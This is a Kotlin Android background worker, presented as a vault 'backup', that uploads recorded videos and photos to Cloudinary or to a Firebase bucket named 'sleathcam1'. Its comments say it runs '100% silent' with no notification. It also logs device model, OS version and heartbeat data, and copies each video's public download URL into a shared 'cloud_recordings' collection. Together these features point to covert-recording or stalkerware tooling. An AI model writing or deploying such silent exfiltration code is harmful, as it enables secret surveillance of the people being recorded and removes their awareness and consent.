package com.example.feature.backup

import android.content.Context
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.data.local.VaultDatabase
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageMetadata
import kotlinx.coroutines.tasks.await
import java.io.File

/**
 * 100% Silent Background Upload Worker.
 * Executes quietly in background without displaying any notifications in the Android notification shade.
 * Automatically tries Cloudinary (if configured) or direct Firebase Storage fallback.
 */
class VaultChunkedUploadWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    companion object {
        private const val TAG = "VaultUploadWorker"

        const val KEY_MEDIA_ID = "key_media_id"
        const val KEY_FILE_PATH = "key_file_path"
        const val KEY_FILE_NAME = "key_file_name"
        const val KEY_MIME_TYPE = "key_mime_type"
        const val KEY_DURATION_MS = "key_duration_ms"
    }

    override suspend fun doWork(): Result {
        val mediaId = inputData.getString(KEY_MEDIA_ID) ?: return Result.failure()
        val filePath = inputData.getString(KEY_FILE_PATH) ?: return Result.failure()
        val fileName = inputData.getString(KEY_FILE_NAME) ?: "media_$mediaId.mp4"
        val mimeType = inputData.getString(KEY_MIME_TYPE) ?: "video/mp4"
        val durationMs = inputData.getLong(KEY_DURATION_MS, 0L)

        val file = File(filePath)
        if (!file.exists() || file.length() <= 0L) {
            Log.e(TAG, "File does not exist or is empty: $filePath")
            return Result.failure()
        }

        val auth = FirebaseAuth.getInstance()
        val uid = auth.currentUser?.uid ?: AnonymousCloudBackupManager.getDeviceId(applicationContext)
        val deviceId = AnonymousCloudBackupManager.getDeviceId(applicationContext)
        val isVideo = mimeType.startsWith("video/")
        val now = System.currentTimeMillis()

        // Update heartbeat & install status in Firestore immediately
        try {
            val firestore = FirebaseFirestore.getInstance()
            firestore.collection("users").document(uid).set(
                mapOf(
                    "uid" to uid,
                    "deviceId" to deviceId,
                    "appStatus" to "INSTALLED",
                    "accountStatus" to "ACTIVE",
                    "isInstalled" to true,
                    "deviceModel" to "${Build.MANUFACTURER} ${Build.MODEL}",
                    "androidVersion" to Build.VERSION.RELEASE,
                    "lastSeenEpochMs" to now,
                    "lastHeartbeatEpochMs" to now,
                    "updatedAtEpochMs" to now
                ),
                SetOptions.merge()
            ).await()
        } catch (_: Exception) {}

        try {
            var publicUrl = ""
            var publicId = ""

            // 1. Try Cloudinary if available
            val uploadResult: kotlin.Result<com.example.integration.cloudinary.CloudinaryUploadResult> = try {
                CloudinaryResumableChunkUploader.uploadFileChunked(
                    context = applicationContext,
                    mediaId = mediaId,
                    file = file,
                    mimeType = mimeType,
                    fileName = fileName,
                    onProgress = null
                )
            } catch (e: Exception) {
                kotlin.Result.failure(e)
            }

            if (uploadResult.isSuccess) {
                val res = uploadResult.getOrThrow()
                publicId = res.publicId
                publicUrl = res.secureUrl
            } else {
                // 2. Fallback to Firebase Storage directly
                Log.d(TAG, "Cloudinary upload unavailable, falling back to Firebase Storage for $fileName...")
                val storage = try {
                    FirebaseStorage.getInstance("gs://sleathcam1.firebasestorage.app")
                } catch (_: Exception) {
                    FirebaseStorage.getInstance()
                }
                val ext = if (isVideo) "mp4" else "jpg"
                val storagePath = "guest_recordings/$uid/$mediaId.$ext"
                val storageRef = storage.reference.child(storagePath)
                val meta = StorageMetadata.Builder()
                    .setContentType(mimeType)
                    .setCustomMetadata("recordingId", mediaId)
                    .setCustomMetadata("fileName", fileName)
                    .setCustomMetadata("deviceId", deviceId)
                    .build()

                storageRef.putFile(Uri.fromFile(file), meta).await()
                publicUrl = try { storageRef.downloadUrl.await().toString() } catch (_: Exception) { "" }
                publicId = storagePath
            }

            // Sync metadata to Firestore: users/{uid}/vault_media/{mediaId}
            val firestore = FirebaseFirestore.getInstance()
            val metadataMap = mapOf(
                "mediaId" to mediaId,
                "id" to mediaId,
                "fileName" to fileName,
                "mediaType" to (if (isVideo) "VIDEO" else "PHOTO"),
                "sizeBytes" to file.length(),
                "fileSize" to file.length(),
                "durationMs" to durationMs,
                "isEncryptedLocally" to false,
                "cloudinaryPublicId" to publicId,
                "cloudinarySecureUrl" to publicUrl,
                "downloadUrl" to publicUrl,
                "storagePath" to publicId,
                "backupStatus" to "SUCCESS",
                "backupTimestampMs" to now,
                "isDeletedByUser" to false,
                "visibility" to "VISIBLE",
                "deviceId" to deviceId,
                "userId" to uid,
                "anonymousAccountReference" to uid,
                "updatedAtEpochMs" to now
            )

            firestore.collection("users")
                .document(uid)
                .collection("vault_media")
                .document(mediaId)
                .set(metadataMap, SetOptions.merge())
                .await()

            // Also mirror in cloud_recordings collection if it's a recording/video
            if (isVideo) {
                val cloudRecordingMap = mapOf(
                    "recordingId" to mediaId,
                    "id" to mediaId,
                    "mediaId" to mediaId,
                    "ownerType" to "GUEST",
                    "anonymousAccountReference" to uid,
                    "userId" to uid,
                    "deviceId" to deviceId,
                    "deviceModel" to "${Build.MANUFACTURER} ${Build.MODEL}",
                    "androidVersion" to Build.VERSION.RELEASE,
                    "fileName" to fileName,
                    "fileSize" to file.length(),
                    "sizeBytes" to file.length(),
                    "duration" to durationMs,
                    "durationMs" to durationMs,
                    "mimeType" to mimeType,
                    "downloadUrl" to publicUrl,
                    "cloudinarySecureUrl" to publicUrl,
                    "status" to "ACTIVE",
                    "createdAt" to now,
                    "updatedAt" to now
                )
                firestore.collection("cloud_recordings")
                    .document(mediaId)
                    .set(cloudRecordingMap, SetOptions.merge())
                    .await()
            }

            // Mark local item as cloud synced in Room DB
            try {
                val db = VaultDatabase.getInstance(applicationContext)
                db.mediaDao().markMediaAsCloudSynced(listOf(mediaId))
            } catch (_: Exception) {}

            Log.i(TAG, "Successfully backed up $fileName ($mediaId) to cloud: $publicUrl")
            return Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Worker exception for $fileName: ${e.message}", e)
            return Result.retry()
        }
    }
}
